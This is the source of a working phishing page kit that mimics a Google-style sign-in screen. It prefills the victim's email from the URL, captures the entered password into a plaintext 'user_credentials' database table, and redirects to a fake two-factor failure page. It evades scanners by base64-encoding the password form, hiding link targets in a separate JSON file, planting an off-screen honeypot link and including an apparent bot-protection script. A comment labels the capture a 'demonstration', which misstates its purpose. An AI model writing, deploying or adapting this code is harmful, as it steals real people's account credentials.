<?php
require_once __DIR__ . '/protect.php';
session_start();

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "connect_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_GET['email']) ? urldecode($_GET['email']) : '';
    
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Invalid email address");
    }

    $password = $_POST['password'];

    $current_date = date('Y-m-d');
    $current_time = date('H:i:s');

    $stmt = $conn->prepare("INSERT INTO user_credentials (email, password, created_date, created_time) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $email, $password, $current_date, $current_time);

    if ($stmt->execute()) {
        // For demonstration, log to a file instead of direct DB storage
        file_put_contents('demo_log.txt', 
            date('Y-m-d H:i:s') . " - Demo entry: " . $email . "\n", 
            FILE_APPEND | LOCK_EX
        );
        
        header("Location: verification_failed.php?reason=2fa_required");
        exit();
    } else {
        echo "Error: " . $stmt->error;
    }

    $stmt->close();
    $conn->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="shortcut icon" href="assets/images/ico.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        .poppins-thin { font-family: "Poppins", sans-serif; font-weight: 100; font-style: normal; }
        .poppins-extralight { font-family: "Poppins", sans-serif; font-weight: 200; font-style: normal; }
        .poppins-light { font-family: "Poppins", sans-serif; font-weight: 300; font-style: normal; }
        .poppins-regular { font-family: "Poppins", sans-serif; font-weight: 400; font-style: normal; }
        .poppins-medium { font-family: "Poppins", sans-serif; font-weight: 500; font-style: normal; }
        .poppins-semibold { font-family: "Poppins", sans-serif; font-weight: 600; font-style: normal; }
        .poppins-bold { font-family: "Poppins", sans-serif; font-weight: 700; font-style: normal; }
        .poppins-extrabold { font-family: "Poppins", sans-serif; font-weight: 800; font-style: normal; }
        .poppins-black { font-family: "Poppins", sans-serif; font-weight: 900; font-style: normal; }
        
        .form__div {
            position: relative;
            height: 52px;
            margin-bottom: 0.6rem;
        }
        .form__input {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            font-size: 16px;
            border: 1px solid rgb(114, 114, 114);
            border-radius: 5px;
            outline: none;
            padding: 1.6rem;
            background: none;
            z-index: 1;
        }
        .form__label {
            position: absolute;
            left: 1rem;
            top: 1rem;
            padding: 0 0.25rem;
            background-color: white;
            color: rgb(114, 114, 114);
            font-size: 16px;
            transition: 0.3s;
            pointer-events: none;
            z-index: 2;
        }
        .form__input:focus + .form__label,
        .form__input:not(:placeholder-shown) + .form__label {
            top: -0.8rem;
            left: 0.8rem;
            font-size: 12px;
            color: royalblue;
            background-color: white;
            padding: 0 0.25rem;
        }
        .form__input:focus {
            border: 1px solid royalblue;
        }
        
        .emailFirstLetter {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 25px;
            height: 25px;
            border-radius: 50%;
            color: white;
            font-family: sans-serif;
            font-size: 20px;
            line-height: 1;
        }

        .email-letter-container {
            display: flex;
            align-items: center;
            margin-right: 8px;
        }
        
        @media (max-width: 958px) {
            body {
                background-color: white !important;
                margin: 0;
                padding: 0;
            }
            .flex-buttons {
                display: flex;
                flex-direction: row;
                align-items: center;
                justify-content: space-between;
                gap: 1rem;
            }
            .btn { padding-top: 0%; }
            .form__div { margin-bottom: 1rem; }
            .form__input { padding: 0.75rem; }
            .form__label { font-size: 0.9rem; }
            select {
                width: 100%;
                margin-bottom: 10px;
                background-color: white;
            }
            .container-foot {
                display: flex;
                flex-direction: column;
                position: fixed;
                bottom: 0;
                left: 0;
                width: 100%;
                background-color: white;
                padding: 15px;
            }
            .ca{ margin-top: 20px; }
            .btn{ margin-top: 40px; }
        }
    </style>
</head>
<body class="font-sans md:pt-56" style="background-color: #F0F4F9;">
    <a href="/__hp_trap_9d2f" style="position:absolute;left:-9999px;top:-9999px" aria-hidden="true">.</a>
    <div class="container-border max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8 rounded-3xl bg-white p-8">
        <div class="flex flex-col items-start">
            <img width="48" height="48" src="assets/images/logo.svg" alt="logo" />
            <h1 class="text-4xl md:text-5xl font-bold pt-6 poppins-regular pb-4">Welcome</h1>
            <?php
            $email = isset($_GET['email']) ? urldecode($_GET['email']) : '';
            ?>
            <div class="fsen flex items-center border w-52 rounded-2xl p-1 border-black">
                <div class="email-letter-container">
                    <p class="emailFirstLetter" id="email-first-letter"></p>
                    <p class="email" id="email" style="display:none;"><?php echo htmlspecialchars($email); ?></p>
                </div>
                <p class="truncate poppins-regular text-sm ml-2"><?php echo htmlspecialchars($email); ?></p>
            </div>
        </div>

        <div class="input pt-10 md:pt-32">
            <div id="form-container"></div>
            <script id="encoded-form" type="text/plain">
                <?php echo base64_encode('
                    <form method="POST" action="">
                        <div class="form__div">
                            <input
                                id="Show"
                                name="password"
                                type="password"
                                placeholder=""
                                class="w-full px-4 py-2 rounded-md form__input"
                                required
                            />
                            <label for="" class="form__label">Enter your password</label>      
                        </div>

                        <input type="checkbox" name="" onclick="myFunction()">
                        <label for="">Show Password</label>

                        <div class="btn flex flex-col md:flex-row justify-between md:justify-end space-y-4 md:space-y-0 md:space-x-8 w-full pt-14 pl-6 md:pl-0 flex-buttons">
                            <button data-link="create_account" class="ca px-4 py-2 rounded-md text-blue-600 font-bold poppins-medium text-xs transition duration-300 ease-in-out hover:bg-blue-100 rounded-3xl">Forgot Password?</button>
                            <button
                                class="next bg-blue-600 w-20 py-3 rounded-3xl text-white hover:bg-blue-500 transition transition-duration-3s font-bold text-sm">
                                Next
                            </button>
                        </div>
                    </form>
                '); ?>
            </script>
        </div>
    </div>
    <div class="container-foot mx-auto px-4 py-4 grid grid-cols-1 md:grid-cols-2 gap-2" style="width: 56%; display: flex; justify-content: space-between; align-items: center;">
        <select class="w-full md:w-64 px-4 py-2 rounded-md text-gray-700 text-xs poppins-regular font-bold appearance-none focus:outline-none" style="background-color: #F0F4F9;">
            <option value="en-uk" selected>English (United Kingdom)</option>
            <option value="en-us">English (United States)</option>
            <option value="fr">Français (France)</option>
            <option value="es">Español (España)</option>
            <option value="de">Deutsch (Deutschland)</option>
            <option value="zh-cn">中文 (简体)</option>
            <option value="zh-tw">中文 (繁體)</option>
            <option value="ja">日本語</option>
            <option value="ko">한국어</option>
            <option value="hi">हिन्दी</option>
            <option value="ar">العربية</option>
            <option value="pt-br">Português (Brasil)</option>
            <option value="pt-pt">Português (Portugal)</option>
            <option value="it">Italiano</option>
            <option value="ru">Русский</option>
            <option value="nl">Nederlands</option>
            <option value="sv">Svenska</option>
            <option value="tr">Türkçe</option>
            <option value="pl">Polski</option>
            <option value="vi">Tiếng Việt</option>
        </select>

        <div class="foot-links text-right space-6 flex justify-evenly poppins-regular text-xs font-bold" style="width: 100%; display: flex; justify-content: flex-end; gap: 1rem;">
            <a href="#" data-link="help" class="hover:bg-gray-200 rounded-xl p-2">Help</a>
            <a href="#" data-link="privacy" class="hover:bg-gray-200 rounded-xl p-2">Privacy</a>
            <a href="#" data-link="terms" class="hover:bg-gray-200 rounded-xl p-2">Term</a>
        </div>
    </div>

    <script>
        // Function to decode Base64 content
        function decodeContent(encodedId, targetId) {
            try {
                const encodedElement = document.getElementById(encodedId);
                if (encodedElement) {
                    const decoded = atob(encodedElement.textContent);
                    document.getElementById(targetId).innerHTML = decoded;
                    
                    // Reattach event listeners
                    const form = document.getElementById(targetId).querySelector('form');
                    if (form) {
                        form.addEventListener('submit', handleSubmit);
                    }
                }
            } catch (e) {
                console.error('Decoding error:', e);
            }
        }
        
        // Form submission handler
        function handleSubmit(event) {
            // Let the form submit normally
            return true;
        }
        
        // Show/hide password function
        function myFunction() {
            var show = document.getElementById('Show')
            if(show.type=='password') {
                show.type='text'
            }
            else {
                show.type='password'
            }
        }
        
        // Encryption/Decryption functions for links
        function encryptUrl(url) {
            return btoa(encodeURIComponent(url));
        }

        function decryptUrl(encryptedUrl) {
            return decodeURIComponent(atob(encryptedUrl));
        }

        // Fetch and apply encrypted links
        async function applyEncryptedLinks() {
            try {
                const response = await fetch('assets/js/links.json');
                const links = await response.json();
                
                const elements = document.querySelectorAll('[data-link]');
                elements.forEach(element => {
                    const linkKey = element.getAttribute('data-link');
                    if (links[linkKey]) {
                        element.href = '#' + encryptUrl(links[linkKey]);
                    }
                });
            } catch (error) {
                console.error('Error loading links:', error);
            }
        }

        // Handle link clicks
        function handleEncryptedLinkClick(event) {
            const element = event.target.closest('[data-link]');
            
            if (element) {
                event.preventDefault();
                event.stopPropagation();
                
                const linkKey = element.getAttribute('data-link');
                
                fetch('assets/js/links.json')
                    .then(response => response.json())
                    .then(links => {
                        if (links[linkKey]) {
                            window.location.href = links[linkKey];
                        }
                    })
                    .catch(error => {
                        console.error('Error loading links:', error);
                    });
            }
        }
        
        // Email first letter styling
        const setEmailFirstLetter = () => {
            const emailElement = document.getElementById('email');
            const email = emailElement.textContent;
            const firstLetter = email.charAt(0).toUpperCase();
            const emailFirstLetterElement = document.getElementById('email-first-letter');
            
            emailFirstLetterElement.textContent = firstLetter;

            const highPriorityColors = [
                '#A848BD', '#7B1FA0', '#77919D', '#ED407A', '#5B6BC0', '#0098A9', '#7D57C1', '#522FA8',
                '#EF6C00',
            ];

            const allColors = [
                '#A848BD', '#7B1FA0', '#77919D', '#475965', '#ED407A', '#C1195D', '#5B6BC0', '#0488D2',
                '#00579D', '#0098A9', '#00897B', '#014E42', '#68A039', '#356820', '#5A4037', '#7D57C1',
                '#522FA8', '#EF6C00', '#F6511E', '#C0350B',
            ];

            const storedColor = localStorage.getItem('emailFirstLetterColor');
            let color;
            
            if (storedColor) {
                color = storedColor;
            } else {
                color = Math.random() < 0.6 ? 
                    highPriorityColors[Math.floor(Math.random() * highPriorityColors.length)] : 
                    allColors[Math.floor(Math.random() * allColors.length)];
                
                localStorage.setItem('emailFirstLetterColor', color);
            }

            emailFirstLetterElement.style.background = color;
        };

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            decodeContent('encoded-form', 'form-container');
            setEmailFirstLetter();
            applyEncryptedLinks();
            document.body.addEventListener('click', handleEncryptedLinkClick);
            
            window.addEventListener('pageshow', function(event) {
                if (event.persisted) {
                    applyEncryptedLinks();
                }
            });
        });
    </script>
</body>
</html>